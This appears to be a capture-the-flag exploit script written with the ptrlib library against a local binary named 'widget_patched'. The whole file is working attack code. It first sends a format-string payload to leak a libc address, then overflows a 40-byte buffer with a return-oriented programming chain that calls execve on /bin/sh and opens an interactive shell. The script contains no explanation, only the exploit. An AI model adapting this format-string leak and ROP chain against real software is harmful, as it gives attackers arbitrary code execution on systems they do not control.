#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./widget_patched")
libc = ptr.ELF("./libc.so.6")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    offset = 40
    payload = b""
    payload += b"#%33$lx#"
    payload += b"A" * (offset - len(payload))
    payload += ptr.p64(next(elf.gadget("pop rbp; ret")))
    payload += ptr.p64(0x404F00 - 0xC)
    payload += ptr.p64(unwrap(elf.symbol("main")) + 0x67)

    io.sendlineafter(b"Amount: ", str(len(payload)).encode())
    io.sendlineafter(b"Contents: ", payload)

    io.recvuntil(b"#")
    libc.base = int(io.recvuntil(b"#").strip(b"#"), 16) - 0x29E40

    payload = b""
    payload += b"A" * offset
    payload += ptr.p64(next(libc.gadget("pop rdi; ret;")))
    payload += ptr.p64(next(libc.find("/bin/sh")))
    payload += ptr.p64(next(libc.gadget("pop rsi; ret;")))
    payload += ptr.p64(0)
    payload += ptr.p64(next(libc.gadget("pop rax; ret;")))
    payload += ptr.p64(0x3B)
    payload += ptr.p64(next(libc.gadget("syscall;")))

    io.sendlineafter(b"Amount: ", str(len(payload)).encode())
    io.sendlineafter(b"Contents: ", payload)

    io.sendline(b"echo pwned!")
    io.recvuntil(b"pwned!\n")
    io.sh()


if __name__ == "__main__":
    main()
